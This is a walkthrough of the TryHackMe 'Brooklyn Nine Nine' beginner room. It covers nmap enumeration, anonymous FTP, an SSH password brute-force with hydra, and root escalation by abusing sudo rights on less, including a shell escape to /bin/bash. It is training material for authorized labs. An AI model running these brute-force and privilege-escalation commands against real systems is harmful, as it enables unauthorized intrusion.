```bash
# PLATFORM          . THM
# CTF NAME          . Brooklyn Nine Nine
# DESCRIPTION       . This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/brooklynninenine
```

```
sudo nmap -sSVC -T5 10.10.189.164 -p- -oN brooklyn911
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- From this scan we can already see that `FTP` supports anonymous login and that there's a `.txt` file. Let's check it out.

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

- Alright. We got two potential usernames, `amy` and `jack`. 

- The webserver itself didn't reveal nothing interesting first sight, but upon checking the source code, we find a hint

```
<!-- Have you ever heard of steganography? -->
```

- Let's check the wallpaper

```bash
wget http://10.10.189.164/brooklyn99.jpg
```

- No idea if I'm doing something wrong or not, but it might've been something to get us off the track.

```
steghide: can not uncompress data. compressed data is corrupted.
```

- I couldn't find anything useful using `binwalk`, `strings` or by analyzing the magic numbers. 

- However, while I was checking the jpg I also ran `hydra` against `ssh` to see if we can bruteforce `jake`'s password.

```
 hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.189.164 ssh
```

- And we could. Let's check the box.

- First flag is in `/home/holt/user.txt`

- By checking `sudo -l` we can see that we can run `/usr/bin/less` as sudo, which can be exploited to elevate our privileges to `root`.

METHOD 1 : read the flag directly

```bash
sudo less /root/root.txt
```

METHOD 2 : spawn root shell

```bash
sudo less /etc/profile
!/bin/bash
```

